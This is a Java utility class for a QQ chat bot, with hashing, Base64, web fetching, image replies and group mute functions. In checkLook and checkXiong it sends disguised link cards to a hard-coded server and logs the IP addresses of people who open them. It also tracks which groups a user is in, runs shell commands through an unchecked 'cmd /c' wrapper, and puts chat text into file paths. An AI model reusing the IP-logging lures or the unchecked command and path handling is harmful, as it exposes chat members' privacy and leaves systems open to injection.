package com.meng.tools;

import com.meng.*;
import com.meng.picEdit.*;
import com.sobte.cqp.jcq.entity.*;
import java.io.*;
import java.net.*;
import java.nio.charset.*;
import java.security.*;
import java.text.*;
import java.util.*;
import org.jsoup.*;

public class Tools {

	public static final String DEFAULT_ENCODING = "UTF-8";

	public static class CMD{
		public static String executeCmd(String command) throws IOException {
			Runtime runtime = Runtime.getRuntime();
			Process process = runtime.exec("cmd /c " + command);
			BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
			String line = null;
			StringBuilder build = new StringBuilder();
			while ((line = br.readLine()) != null) {
				build.append(line);
			}
			return build.toString();
		}
	}
	public static class FileTool {
		public static String readString(String fileName) {
			return readString(new File(fileName));
		}
		public static String readString(File f) {
			String s = "{}";
			try {      
				if (!f.exists()) {
					f.createNewFile();
				}
				long filelength = f.length();
				byte[] filecontent = new byte[(int) filelength];
				FileInputStream in = new FileInputStream(f);
				in.read(filecontent);
				in.close();
				s = new String(filecontent, StandardCharsets.UTF_8);
			} catch (Exception e) {
				e.printStackTrace();
			}
			return s;
		}
	}

	public static class Hash {
		public static String toMD5(String str) {
			try {
				byte[] strTemp = str.getBytes();
				MessageDigest mdTemp = MessageDigest.getInstance("MD5");
				mdTemp.update(strTemp);
				return toHexString(mdTemp.digest());
			} catch (Exception e) {
				return null;
			}
		}
		public static String toMD5(java.io.File file) {
			InputStream inputStream = null;
			try {
				inputStream = new FileInputStream(file);
				return toMD5(inputStream);
			} catch (Exception e) {
				return null;
			} finally {
				if (inputStream != null) {
					try {
						inputStream.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
		}
		public static String toMD5(InputStream inputStream) {
			try {
				MessageDigest mdTemp = MessageDigest.getInstance("MD5");
				byte[] buffer = new byte[1024];
				int numRead = 0;
				while ((numRead = inputStream.read(buffer)) > 0) {
					mdTemp.update(buffer, 0, numRead);
				}
				return toHexString(mdTemp.digest());
			} catch (Exception e) {
				return null;
			}
		}
		private static String toHexString(byte[] md) {
			char hexDigits[] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
				'a', 'b', 'c', 'd', 'e', 'f' };
			int j = md.length;
			char str[] = new char[j * 2];
			for (int i = 0; i < j; i++) {
				byte byte0 = md[i];
				str[2 * i] = hexDigits[byte0 >>> 4 & 0xf];
				str[i * 2 + 1] = hexDigits[byte0 & 0xf];
			}
			return new String(str);
		}
	}

	public static class Network {
		public static Map<String, String> cookieToMap(String value) {
			Map<String, String> map = new HashMap<>();
			String[] values = value.split("; ");
			for (String val : values) {
				String[] vals = val.split("=");
				if (vals.length == 2) {
					map.put(vals[0], vals[1]);
				} else if (vals.length == 1) {
					map.put(vals[0], "");
				}
			}
			return map;
		}
		public static String getRealUrl(String surl) throws Exception {
			URL url = new URL(surl);
			URLConnection conn = url.openConnection();
			conn.connect();
			BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
			String nurl = conn.getURL().toString();
			System.out.println("realUrl" + nurl);
			in.close();
			return nurl;
		}
		public static String getSourceCode(String url) {
			return getSourceCode(url, null);
		}
		public static String getSourceCode(String url, String cookie) {
			Connection.Response response = null;
			Connection connection;
			try {
				connection = Jsoup.connect(url).ignoreContentType(true).method(Connection.Method.GET);
				if (cookie != null) {
					connection.cookies(cookieToMap(cookie));
				}
				response = connection.execute();
			} catch (IOException e) {
				e.printStackTrace();
			}
			if (response != null) {
				return response.body();
			} else {
				return null;
			}
		}
	}

	public static class CQ {
		public static String getTime() {
			return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
		}
		public static String getTime(long timeStamp) {
			return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timeStamp));
		}
		public static String getDate() {
			return new SimpleDateFormat("yyyy-MM-dd").format(new Date());
		}
		public static String getDate(long timeStamp) {
			return new SimpleDateFormat("yyyy-MM-dd").format(new Date(timeStamp));
		}
		public static boolean isPohaitu(long fromGroup, long fromQQ, String msg) {
			if (msg.equals("迫害图")) {
				String[] strings = (new File(Autoreply.appDirectory + "pohai/")).list();
				StringBuilder sBuilder = new StringBuilder("现在有");
				for (String s : strings) {
					sBuilder.append(" ").append(s);
				}
				sBuilder.append("的迫害图");
				Autoreply.sendMessage(fromGroup, fromQQ, sBuilder.toString());
				return true;
			}
			if (msg.endsWith("迫害图")) {
				switch (msg) {
					case "零食迫害图":
						msg = "鸽鸽迫害图";
						break;
					case "旭东迫害图":
						msg = "天星厨迫害图";
						break;
					case "星小渚迫害图":
						msg = "杏子迫害图";
						break;
				}
				File[] files = (new File(Autoreply.appDirectory + "pohai/" + msg.replace("迫害图", ""))).listFiles();
				if (files != null && files.length > 0) {
					Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(files)))));
					Autoreply.instence.useCount.incPohaitu(fromQQ);
					Autoreply.instence.groupCount.incPohaitu(fromGroup);
					Autoreply.instence.useCount.incPohaitu(Autoreply.CQ.getLoginQQ());
				}
				return true;
			}
			return false;
		}
		public static boolean isSetu(long fromGroup, long fromQQ, String msg) {
			if (msg.equals("色图")) {
				String[] strings = (new File(Autoreply.appDirectory + "setu/")).list();
				StringBuilder sBuilder = new StringBuilder("现在有");
				for (String s : strings) {
					sBuilder.append(" ").append(s);
				}
				sBuilder.append("的色图");
				Autoreply.sendMessage(fromGroup, fromQQ, sBuilder.toString());
				return true;
			} else if (msg.equals("随机色图")) {
				File[] files = (new File(Autoreply.appDirectory + "setu/")).listFiles();
				File folder = (File) Tools.ArrayTool.rfa(files);
				File[] pics = folder.listFiles();
				Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(pics)))));
				Autoreply.instence.useCount.incSetu(fromQQ);
				Autoreply.instence.groupCount.incSetu(fromGroup);
				Autoreply.instence.useCount.incSetu(Autoreply.CQ.getLoginQQ());
			} else if (msg.endsWith("色图")) {
				File[] files = (new File(Autoreply.appDirectory + "setu/" + msg.replace("色图", ""))).listFiles();
				if (files != null && files.length > 0) {
					Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(files)))));
					Autoreply.instence.useCount.incSetu(fromQQ);
					Autoreply.instence.groupCount.incSetu(fromGroup);
					Autoreply.instence.useCount.incSetu(Autoreply.CQ.getLoginQQ());
				}
				return true;
			}
			return false;
		}
		public static boolean isNvZhuang(long fromGroup, long fromQQ, String msg) {
			if (msg.equals("随机女装")) {
				File[] files = (new File(Autoreply.appDirectory + "nvzhuang/")).listFiles();
				File folder = (File) Tools.ArrayTool.rfa(files);
				File[] pics = folder.listFiles();
				Autoreply.instence.useCount.incSetu(fromQQ);
				Autoreply.instence.groupCount.incSetu(fromGroup);
				Autoreply.instence.useCount.incSetu(Autoreply.CQ.getLoginQQ());
				Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(pics)))));
			} else if (msg.endsWith("女装")) {
				File[] files = (new File(Autoreply.appDirectory + "nvzhuang/" + msg.replace("女装", ""))).listFiles();
				if (files != null && files.length > 0) {
					Autoreply.instence.useCount.incSetu(fromQQ);
					Autoreply.instence.groupCount.incSetu(fromGroup);
					Autoreply.instence.useCount.incSetu(Autoreply.CQ.getLoginQQ());
					Autoreply.instence.threadPool.execute(new DeleteMessageRunnable(Autoreply.sendMessage(fromGroup, fromQQ, Autoreply.instence.CC.image((File) Tools.ArrayTool.rfa(files)))));
				}
				return true;
			}

			return false;
		}
		// 窥屏检测
		public static boolean checkLook(long fromGroup, String msg) {
			if (msg.equals("有人吗") || msg.equalsIgnoreCase("testip") || msg.equalsIgnoreCase("窥屏检测")) {
				int port = Autoreply.instence.random.nextInt(5000);
				Autoreply.sendMessage(fromGroup, 0, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "窥屏检测", "滴滴滴", "http://123.207.65.93:" + (port + 4000) + "/111.jpg"));
				final IPGetter ipGetter = new IPGetter(fromGroup, port);
				Autoreply.instence.threadPool.execute(ipGetter);
				Timer timer = new Timer();
				timer.schedule(new TimerTask() {
						@Override
						public void run() {
							Autoreply.sendMessage(ipGetter.fromGroup, 0, "当前有" + ipGetter.hSet.size() + "个小伙伴看了群聊");
							ipGetter.running = false;
						}
					}, 20000);
				return true;
			}
			return false;
		}
		public static boolean checkXiong(long fromQQ, String msg) {
			if (Autoreply.instence.configManager.isAdmin(fromQQ)) {
				if (msg.equals("吊熊")) {
					int port = Autoreply.instence.random.nextInt(5000);
					Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
					final XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
					Autoreply.instence.threadPool.execute(ipGetter);
					Timer timer = new Timer();
					timer.schedule(new TimerTask() {
							@Override
							public void run() {
								ipGetter.running = false;
							}
						}, 200000);
					return true;
				}
				if (msg.equals("吊熊2")) {
					int port = Autoreply.instence.random.nextInt(5000);
					Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
					XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
					Autoreply.instence.threadPool.execute(ipGetter);
					return true;
				}
			}
			return false;
		}
		public static boolean checkAt(long fromGroup, long fromQQ, String msg) {
			if (msg.contains("~") || msg.contains("～")) {
				return false;
			}
			if (Autoreply.instence.CC.getAt(msg) == Autoreply.CQ.getLoginQQ()) {
				if (msg.startsWith("精神支柱[CQ:at")) {
					new JingShenZhiZhuQQManager(fromGroup, fromQQ, Autoreply.instence.CC.at(fromQQ));
					return true;
				} else if (msg.startsWith("神触[CQ:at")) {
					new ShenChuQQManager(fromGroup, fromQQ, Autoreply.instence.CC.at(fromQQ));
					return true;
				}
				// 过滤特定的文字
				// @消息发送者并复读内容
				if (msg.contains("蓝") || msg.contains("藍") || msg.contains("赠送")) {
					return true;
				}
				if (fromQQ == 2558395159L || fromQQ == 1281911569L || fromQQ == Autoreply.instence.configManager.configJavaBean.ogg) {
					return true;
				}
				Autoreply.sendMessage(fromGroup, 0, msg.replace("[CQ:at,qq=" + Autoreply.CQ.getLoginQQ() + "]", "[CQ:at,qq=" + fromQQ + "]"));
				return true;
			}
			return false;
		}
		public static void findQQInAllGroup(long fromGroup, long fromQQ, String msg) {
			long findqq;
			try {
				findqq = Long.parseLong(msg.substring(10));
			} catch (Exception e) {
				findqq = Autoreply.instence.CC.getAt(msg);
			}
			if (findqq <= 0) {
				Autoreply.sendMessage(fromGroup, fromQQ, "QQ账号错误");
				return;
			}
			Autoreply.sendMessage(fromGroup, fromQQ, "running");
			HashSet<Group> hashSet = findQQInAllGroup(findqq);
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.append(findqq).append("在这些群中出现");
			for (Group l : hashSet) {
				stringBuilder.append("\n").append(l.getId()).append(l.getName());
			}
			Autoreply.sendMessage(fromGroup, fromQQ, stringBuilder.toString());
		}
		public static HashSet<Group> findQQInAllGroup(long findQQ) {
			List<Group> groups = Autoreply.CQ.getGroupList();
			HashSet<Group> hashSet = new HashSet<>();
			for (Group group : groups) {
				if (group.getId() == 959615179L || group.getId() == 666247478L) {
					continue;
				}
				ArrayList<Member> members = (ArrayList<Member>) Autoreply.CQ.getGroupMemberList(group.getId());
				for (Member member : members) {
					if (member.getQqId() == findQQ) {
						hashSet.add(group);
						break;
					}
				}
			}
			return hashSet;
		}
		public static boolean isAtme(String msg) {
			List<Long> list = Autoreply.instence.CC.getAts(msg);
			long me = Autoreply.CQ.getLoginQQ();
			for (long l : list) {
				if (l == me) {
					return true;
				}
			}
			return false;
		}
		public static boolean ban(long fromGroup, long banQQ, int time) {
			if (banQQ == 2558395159L || Autoreply.instence.configManager.isAdmin(banQQ)) {
				return false;
			}
			Member me = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, Autoreply.CQ.getLoginQQ());
			Member ban = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, banQQ);
			if (me.getAuthority() - ban.getAuthority() > 0) {
				Autoreply.CQ.setGroupBan(fromGroup, banQQ, time);
				Autoreply.instence.useCount.incGbanCount(Autoreply.CQ.getLoginQQ());
				return true;
			} else {
				Member ogg = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, Autoreply.instence.configManager.configJavaBean.ogg);
				if (ogg != null && ogg.getAuthority() - ban.getAuthority() > 0) {
					Autoreply.sendMessage(Autoreply.mainGroup, 0, "~mutegroupuser " + fromGroup + " " + (time / 60) + " " + banQQ);
					Autoreply.instence.useCount.incGbanCount(Autoreply.CQ.getLoginQQ());
					return true;
				}
			}
			return false;
		}
		public static void ban(long fromGroup, HashSet<Long> banQQs, int time) {
			long[] qqs = new long[banQQs.size()];
			int i = 0;
			for (long qq : banQQs) {
				qqs[i++] = qq;
			}
			ban(fromGroup, qqs, time);
		}
		public static void ban(long fromGroup, long[] banQQs, float time) {
			Member me = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, Autoreply.CQ.getLoginQQ());
			Member ogg = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, Autoreply.instence.configManager.configJavaBean.ogg);
			StringBuilder banqqs = new StringBuilder("");
			for (long banQQ : banQQs) {
				if (banQQ == 2558395159L) {
					continue;
				}
				Member ban = Autoreply.CQ.getGroupMemberInfoV2(fromGroup, banQQ);
				if (me.getAuthority() - ban.getAuthority() > 0) {
					Autoreply.CQ.setGroupBan(fromGroup, banQQ, (int)time);
					Autoreply.instence.useCount.incGbanCount(Autoreply.CQ.getLoginQQ());
				} else if (ogg != null && ogg.getAuthority() - ban.getAuthority() > 0) {
					banqqs.append(" ").append(banQQ);
					Autoreply.instence.useCount.incGbanCount(Autoreply.CQ.getLoginQQ());
				}
			}
			if (!banqqs.toString().equals("")) {
				Autoreply.sendMessage(Autoreply.mainGroup, 0, "~mutegroupuser " + fromGroup + " " + (time / 60) + banqqs.toString());
			}
		}
		public static void setRandomPop() {
			Tools.Network.getSourceCode("http://logic.content.qq.com/bubble/setup?callback=&id=" + new Random().nextInt(269) + "&g_tk=" + Autoreply.CQ.getCsrfToken(), Autoreply.CQ.getCookies());
		}

		/*  public static String getG_tk(String skey) {
		 int hash = 5381;
		 int flag = skey.length();
		 for (int i = 0; i < flag; i++) {
		 hash = hash + hash * 32 + skey.charAt(i);
		 }
		 return String.valueOf(hash & 0x7fffffff);
		 }*/
	}

	public static class ArrayTool {
		public static byte[] mergeArray(byte[]... arrays) {
			int allLen=0;
			for (byte[] bs:arrays) {
				allLen += bs.length;
			}
			byte[] finalArray=new byte[allLen];
			int flag=0;
			for (byte[] byteArray:arrays) {
				for (int i=0;i < byteArray.length;++flag,++i) {
					finalArray[flag] = byteArray[i];
				}
			}
			return finalArray;
		}

		public static String[] mergeArray(String[]... arrays) {
			int allLen=0;
			for (String[] bs:arrays) {
				allLen += bs.length;
			}
			String[] finalArray=new String[allLen];
			int flag=0;
			for (String[] byteArray:arrays) {
				for (int i=0;i < byteArray.length;++flag,++i) {
					finalArray[flag] = byteArray[i];
				}
			}
			return finalArray;
		}
		public static Object rfa(Object[] array) {
			return array[Autoreply.instence.random.nextInt(array.length)];
		}
	}

	public static class BitConverter {
		public static byte[] getBytes(short s) {
			byte[] bs=new byte[2];
			bs[0] = (byte) ((s >> 0) & 0xff);
			bs[1] = (byte) ((s >> 8) & 0xff) ;
			return bs;	
		}

		public static byte[] getBytes(int i) {
			byte[] bs=new byte[4];
			bs[0] = (byte) ((i >> 0) & 0xff);
			bs[1] = (byte) ((i >> 8) & 0xff);
			bs[2] = (byte) ((i >> 16) & 0xff);
			bs[3] = (byte) ((i >> 24) & 0xff);
			return bs;	
		}

		public static byte[] getBytes(long l) {
			byte[] bs=new byte[8];
			bs[0] = (byte) ((l >> 0) & 0xff);
			bs[1] = (byte) ((l >> 8) & 0xff);
			bs[2] = (byte) ((l >> 16) & 0xff);
			bs[3] = (byte) ((l >> 24) & 0xff);
			bs[4] = (byte) ((l >> 32) & 0xff);
			bs[5] = (byte) ((l >> 40) & 0xff);
			bs[6] = (byte) ((l >> 48) & 0xff);
			bs[7] = (byte) ((l >> 56) & 0xff);
			return bs;
		}

		public static byte[] getBytes(float f) {
			return getBytes(Float.floatToIntBits(f));
		}

		public static byte[] getBytes(Double d) {
			return getBytes(Double.doubleToLongBits(d));
		}

		public static byte[] getBytes(String s) {
			try {
				return s.getBytes(DEFAULT_ENCODING);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
				return null;
			}
		}

		public static short toShort(byte[] data, int pos) {
			return (short) ((data[pos] & 0xff) << 0 | (data[pos + 1] & 0xff) << 8);
		}

		public static short toShort(byte[] data) {
			return toShort(data , 0);
		}

		public static int toInt(byte[] data, int pos) {
			return (data[pos] & 0xff) << 0 | (data[pos + 1] & 0xff) << 8 | (data[pos + 2] & 0xff) << 16 | (data[pos + 3] & 0xff) << 24;
		}

		public static int toInt(byte[] data) {
			return toInt(data, 0);
		}

		public static long toLong(byte[] data, int pos) {
			return ((data[pos] & 0xffL) << 0) | (data[pos + 1] & 0xffL) << 8 | (data[pos + 2] & 0xffL) << 16 | (data[pos + 3] & 0xffL) << 24 | (data[pos + 4] & 0xffL) << 32 | (data[pos + 5] & 0xffL) << 40 | (data[pos + 6] & 0xffL) << 48 | (data[pos + 7] & 0xffL) << 56;
		}

		public static long toLong(byte[] data) {
			return toLong(data , 0);
		}

		public static float toFloat(byte[] data, int pos) {
			return Float.intBitsToFloat(toInt(data, pos));
		}

		public static float toFloat(byte[] data) {
			return toFloat(data , 0);
		}

		public static double toDouble(byte[] data, int pos) {
			return Double.longBitsToDouble(toLong(data, pos));
		}

		public static double toDouble(byte[] data) {
			return toDouble(data , 0);
		}

		public static String toString(byte[] data, int pos, int byteCount) {
			try {
				return new String(data, pos, byteCount, DEFAULT_ENCODING);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
				return null;
			}
		}

		public static String toString(byte[] data) {
			return toString(data, 0, data.length);
		}
	}

	public static class Base64 {
		public static final byte[] encode(String str) {
			try {
				return encode(str.getBytes(DEFAULT_ENCODING));
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
				return null;
			}
		}
		public static final byte[] encode(byte[] byteData) {
			if (byteData == null) { 
				throw new IllegalArgumentException("byteData cannot be null");
			}
			int iSrcIdx; 
			int iDestIdx; 
			byte[] byteDest = new byte[((byteData.length + 2) / 3) * 4];
			for (iSrcIdx = 0, iDestIdx = 0; iSrcIdx < byteData.length - 2; iSrcIdx += 3) {
				byteDest[iDestIdx++] = (byte) ((byteData[iSrcIdx] >>> 2) & 077);
				byteDest[iDestIdx++] = (byte) ((byteData[iSrcIdx + 1] >>> 4) & 017 | (byteData[iSrcIdx] << 4) & 077);
				byteDest[iDestIdx++] = (byte) ((byteData[iSrcIdx + 2] >>> 6) & 003 | (byteData[iSrcIdx + 1] << 2) & 077);
				byteDest[iDestIdx++] = (byte) (byteData[iSrcIdx + 2] & 077);
			}
			if (iSrcIdx < byteData.length) {
				byteDest[iDestIdx++] = (byte) ((byteData[iSrcIdx] >>> 2) & 077);
				if (iSrcIdx < byteData.length - 1) {
					byteDest[iDestIdx++] = (byte) ((byteData[iSrcIdx + 1] >>> 4) & 017 | (byteData[iSrcIdx] << 4) & 077);
					byteDest[iDestIdx++] = (byte) ((byteData[iSrcIdx + 1] << 2) & 077);
				} else {
					byteDest[iDestIdx++] = (byte) ((byteData[iSrcIdx] << 4) & 077);
				}
			}
			for (iSrcIdx = 0; iSrcIdx < iDestIdx; iSrcIdx++) {
				if (byteDest[iSrcIdx] < 26) {
					byteDest[iSrcIdx] = (byte) (byteDest[iSrcIdx] + 'A');
				} else if (byteDest[iSrcIdx] < 52) {
					byteDest[iSrcIdx] = (byte) (byteDest[iSrcIdx] + 'a' - 26);
				} else if (byteDest[iSrcIdx] < 62) {
					byteDest[iSrcIdx] = (byte) (byteDest[iSrcIdx] + '0' - 52);
				} else if (byteDest[iSrcIdx] < 63) {
					byteDest[iSrcIdx] = '+';
				} else {
					byteDest[iSrcIdx] = '/';
				}
			}
			for (; iSrcIdx < byteDest.length; iSrcIdx++) {
				byteDest[iSrcIdx] = '=';
			}
			return byteDest;
		}

		public final static byte[] decode(String str) throws IllegalArgumentException {
			byte[] byteData = null;
			try {
				byteData = str.getBytes(DEFAULT_ENCODING);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
			if (byteData == null) { 
				throw new IllegalArgumentException("byteData cannot be null");
			}
			int iSrcIdx; 
			int reviSrcIdx; 
			int iDestIdx; 
			byte[] byteTemp = new byte[byteData.length];
			for (reviSrcIdx = byteData.length; reviSrcIdx - 1 > 0 && byteData[reviSrcIdx - 1] == '='; reviSrcIdx--) {
				; // do nothing. I'm just interested in value of reviSrcIdx
			}
			if (reviSrcIdx - 1 == 0)	{ 
				return null; 
			}
			byte byteDest[] = new byte[((reviSrcIdx * 3) / 4)];
			for (iSrcIdx = 0; iSrcIdx < reviSrcIdx; iSrcIdx++) {
				if (byteData[iSrcIdx] == '+') {
					byteTemp[iSrcIdx] = 62;
				} else if (byteData[iSrcIdx] == '/') {
					byteTemp[iSrcIdx] = 63;
				} else if (byteData[iSrcIdx] < '0' + 10) {
					byteTemp[iSrcIdx] = (byte) (byteData[iSrcIdx] + 52 - '0');
				} else if (byteData[iSrcIdx] < ('A' + 26)) {
					byteTemp[iSrcIdx] = (byte) (byteData[iSrcIdx] - 'A');
				}  else if (byteData[iSrcIdx] < 'a' + 26) {
					byteTemp[iSrcIdx] = (byte) (byteData[iSrcIdx] + 26 - 'a');
				}
			}
			for (iSrcIdx = 0, iDestIdx = 0; iSrcIdx < reviSrcIdx && iDestIdx < ((byteDest.length / 3) * 3); iSrcIdx += 4) {
				byteDest[iDestIdx++] = (byte) ((byteTemp[iSrcIdx] << 2) & 0xFC | (byteTemp[iSrcIdx + 1] >>> 4) & 0x03);
				byteDest[iDestIdx++] = (byte) ((byteTemp[iSrcIdx + 1] << 4) & 0xF0 | (byteTemp[iSrcIdx + 2] >>> 2) & 0x0F);
				byteDest[iDestIdx++] = (byte) ((byteTemp[iSrcIdx + 2] << 6) & 0xC0 | byteTemp[iSrcIdx + 3] & 0x3F);
			}
			if (iSrcIdx < reviSrcIdx) {
				if (iSrcIdx < reviSrcIdx - 2) {
					byteDest[iDestIdx++] = (byte) ((byteTemp[iSrcIdx] << 2) & 0xFC | (byteTemp[iSrcIdx + 1] >>> 4) & 0x03);
					byteDest[iDestIdx++] = (byte) ((byteTemp[iSrcIdx + 1] << 4) & 0xF0 | (byteTemp[iSrcIdx + 2] >>> 2) & 0x0F);
				} else if (iSrcIdx < reviSrcIdx - 1) {
					byteDest[iDestIdx++] = (byte) ((byteTemp[iSrcIdx] << 2) & 0xFC | (byteTemp[iSrcIdx + 1] >>> 4) & 0x03);
				}  else {
					throw new IllegalArgumentException("Warning: 1 input bytes left to process. This was not Base64 input");
				}
			}
			return byteDest;
		}
	}
}
